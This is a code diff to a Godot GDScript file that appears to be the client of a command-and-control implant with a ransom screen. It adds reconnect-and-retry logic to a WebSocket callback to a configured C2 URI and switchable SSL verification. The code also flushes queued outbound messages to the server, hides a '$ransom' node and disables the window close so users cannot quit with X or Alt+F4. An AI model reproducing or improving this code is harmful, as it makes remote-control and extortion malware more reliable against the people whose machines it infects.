@@ -5,8 +5,11 @@ var time_period = 1
 var do_exit = false
 var exiting = false
 var outbound = []
-var _client = WebSocketClient.new()
+var _client
 var headers
+var connect_attempt
+
+const MAX_CONNECT_ATTEMPT = 3
 
 signal checkin
 signal tasking
@@ -25,10 +28,14 @@ func _notification(what):
 
 
 func _ready():
+	connect_attempt = MAX_CONNECT_ATTEMPT
+
 	get_tree().set_auto_accept_quit(false) # Don't let users click X or alt+F4
 	get_tree().get_root().set_transparent_background(true) # transparent background?
 
 	$ransom.hide()
+	
+	_client = WebSocketClient.new()
 
 	_client.connect("connection_closed", self, "_closed")
 	_client.connect("connection_error", self, "_error")
@@ -39,14 +46,9 @@ func _ready():
 	$CallbackTimer.wait_time = $config.get_callback_wait_time()
 	
 	print("$CallbackTimer.wait_time: ", $CallbackTimer.wait_time)
-	
+
 	_client.set_buffers(1024, 1024, 1024, 1024)
-
-	var err = _client.connect_to_url($config.get_callback_uri(), [], false, $config.get_headers())
-
-	if err != OK:
-		print("Unable to connect")
-		set_process(false)
+	_client.set_verify_ssl_enabled($config.get_verify())
 
 func _on_server_close (code, reason):
 	print("_on_server_close ", code, " " , reason)
@@ -54,6 +56,7 @@ func _on_server_close (code, reason):
 
 func _error():
 	print("websocket error...")
+	connect_attempt -= 1
 
 func _closed(was_clean = false):
 	print("Closed, clean: ", was_clean)
@@ -61,6 +64,7 @@ func _closed(was_clean = false):
 
 func _connected(_proto = ""):
 	print("Connected!")
+	connect_attempt = MAX_CONNECT_ATTEMPT
 
 	$CallbackTimer.start()
 
@@ -99,34 +103,50 @@ func _process(delta):
 	time += delta
 
 	if time > time_period:
-		_client.poll()
+		var status = _client.get_connection_status()
 
-		if $api.checkin_done and not exiting:
-			print("outbound size: %s in %s seconds" % [String(outbound.size()), String($CallbackTimer.wait_time)])
+		if status == NetworkedMultiplayerPeer.CONNECTION_DISCONNECTED:
 
-			time = 0
-
-			if ($CallbackTimer.do_callback and outbound.size() > 0) or do_exit:
-				$CallbackTimer.do_callback = false
-
-				# TODO: flush outbound, slow emit, or only one at a time?
-				while outbound.size() > 0:
-					var msg = outbound.pop_front()
-					print("outbound size: %s in" % String(outbound.size()))
-
-					var ret = _client.get_peer(1).put_packet(msg)
-
-					if ret != OK:
-						print("failed to send data...", msg)
-					else:
-						print("\ndata sent\n")
-
-		if do_exit and outbound.size() <= 0:
-
-			_client.disconnect_from_host()
-
-			if exiting:
+			if connect_attempt <= 0:
 				close_and_quit()
+			else:
+				# TODO: timer for attempts or bursty, go, go, go! ?
+				var err = _client.connect_to_url($config.get_callback_uri(), [], false, $config.get_headers())
+
+				if err != OK:
+					print("Unable to connect")
+					connect_attempt -= 1
+				else:
+					print("connected?")
+		else:
+			_client.poll()
+
+			if $api.checkin_done and not exiting:
+				print("outbound size: %s in %s seconds" % [String(outbound.size()), String($CallbackTimer.wait_time)])
+
+				time = 0
+
+				if ($CallbackTimer.do_callback and outbound.size() > 0) or do_exit:
+					$CallbackTimer.do_callback = false
+
+					# TODO: flush outbound, slow emit, or only one at a time?
+					while outbound.size() > 0:
+						var msg = outbound.pop_front()
+						print("outbound size: %s in" % String(outbound.size()))
+
+						var ret = _client.get_peer(1).put_packet(msg)
+
+						if ret != OK:
+							print("failed to send data...", msg)
+						else:
+							print("\ndata sent\n")
+
+			if do_exit and outbound.size() <= 0:
+
+				_client.disconnect_from_host()
+
+				if exiting:
+					close_and_quit()
 
 func close_and_quit():
 	set_process(false)
